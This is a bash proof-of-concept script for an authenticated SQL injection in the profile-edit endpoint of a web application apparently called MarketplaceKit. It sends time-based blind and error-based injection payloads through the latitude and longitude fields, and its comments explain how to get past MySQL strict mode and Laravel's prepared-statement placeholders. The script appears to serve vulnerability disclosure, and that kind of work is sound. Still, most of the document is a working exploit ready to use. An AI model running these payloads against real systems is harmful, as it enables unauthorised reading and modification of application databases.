#!/usr/bin/env bash
# PoC — MarketplaceKit: authenticated SQL injection via lat/lng in POST /account/edit_profile (CWE-89)
# Affects: master @ 534aa0eb9981a42115bb139f79ae5433b4483a05 (see TARGET-SOURCE.txt)
# Usage:   ./poc-sqli.sh http://127.0.0.1:8081 "laravel_session=..."
# Prereq:  session cookie of a registered, email-verified (users.verified=1) account.
#          Example payloads demonstrate oracles with server metadata (VERSION()) only.
#
# Why the payload looks like this (all confirmed in testing):
#   1. MySQL 8 removed GeomFromText (error 1305 aborts before evaluation). The app
#      targets MySQL 5.6/5.7; run mysql8-geomfromtext-shim.sql on a MySQL 8 test DB
#      to restore the 5.6/5.7 semantics.
#   2. A naive AND-chained payload ('1\' AND (SELECT SLEEP(5)) AND \'') dies with
#      strict-mode error 1292 (string coercion of 'POINT(1...') BEFORE SLEEP evaluates.
#   3. Working bypass: close the string/parens early, add a multi-assignment into
#      another column, park the template's trailing quote in a lazy IF() ELSE branch
#      that never evaluates.
#   4. Laravel uses native prepared statements (ATTR_EMULATE_PREPARES=false), so the
#      trailing "updated_at=?/id=?" placeholders must survive -> keep the tail balanced,
#      never comment it out.

set -euo pipefail
TARGET="${1:?usage: $0 http://<target> '<cookie header>'}"
COOKIE="${2:?usage: $0 http://<target> '<cookie header>'}"

echo "[*] Test 0: baseline benign update (lat=1 lng=5) - establishes timing baseline"
curl -s -o /dev/null -w '    HTTP %{http_code}  time %{time_total}s\n' \
  -X POST "$TARGET/account/edit_profile" \
  -H "Cookie: $COOKIE" \
  --data-urlencode 'username=test' \
  --data-urlencode 'lat=1' \
  --data-urlencode 'lng=5'
# expected: ~2.5-2.8 s on this stack, users.location = POINT(1 5)

echo "[*] Test 1: time-based blind (working bypass form)"
echo "    final SQL: UPDATE users SET location=(GeomFromText('POINT(1 5)')), username=IF((SELECT NOT SLEEP(5)),1,(' x)')), updated_at=? WHERE id=<you>"
curl -s -o /dev/null -w '    HTTP %{http_code}  time %{time_total}s   (expect ~5s delay over baseline)\n' \
  -X POST "$TARGET/account/edit_profile" \
  -H "Cookie: $COOKIE" \
  --data-urlencode 'username=test' \
  --data-urlencode 'lat=1 5)'"'"')) , username = IF((SELECT NOT SLEEP(5)),1,('"'"'' \
  --data-urlencode 'lng=x'

echo "[*] Test 2: conditional time-based oracle on server metadata (VERSION() major)"
echo "    condition TRUE  ('8'): expect ~+5s delay"
curl -s -o /dev/null -w '    HTTP %{http_code}  time %{time_total}s\n' \
  -X POST "$TARGET/account/edit_profile" \
  -H "Cookie: $COOKIE" \
  --data-urlencode 'username=test' \
  --data-urlencode 'lat=1 5)'"'"')) , username = IF((SELECT ASCII(SUBSTRING(VERSION(),1,1))=56),SLEEP(5),1), bio = IF(0,0,('"'"'' \
  --data-urlencode 'lng=x'
echo "    condition FALSE ('9'): expect no delay"
curl -s -o /dev/null -w '    HTTP %{http_code}  time %{time_total}s\n' \
  -X POST "$TARGET/account/edit_profile" \
  -H "Cookie: $COOKIE" \
  --data-urlencode 'username=test' \
  --data-urlencode 'lat=1 5)'"'"')) , username = IF((SELECT ASCII(SUBSTRING(VERSION(),1,1))=57),SLEEP(5),1), bio = IF(0,0,('"'"'' \
  --data-urlencode 'lng=x'

echo "[*] Test 3: error-based oracle - EXP(~0) fires MySQL 1690 only when the condition is TRUE"
curl -s -o /dev/null -w '    TRUE  -> HTTP %{http_code}\n' \
  -X POST "$TARGET/account/edit_profile" \
  -H "Cookie: $COOKIE" \
  --data-urlencode 'username=test' \
  --data-urlencode 'lat=1 5)'"'"')) , username = IF((SELECT ASCII(SUBSTRING(VERSION(),1,1))=56),(SELECT EXP(~0)),1), bio = IF(0,0,('"'"'' \
  --data-urlencode 'lng=x'
grep -c '1690' storage/logs/laravel.log | xargs echo '    1690 entries in storage/logs/laravel.log:'
# expected: the TRUE-condition request adds exactly one MySQL 1690 entry
#           (DOUBLE value is out of range in 'exp(~(0))') and the raw payload text
#           is visible verbatim in the executed SQL in the same log
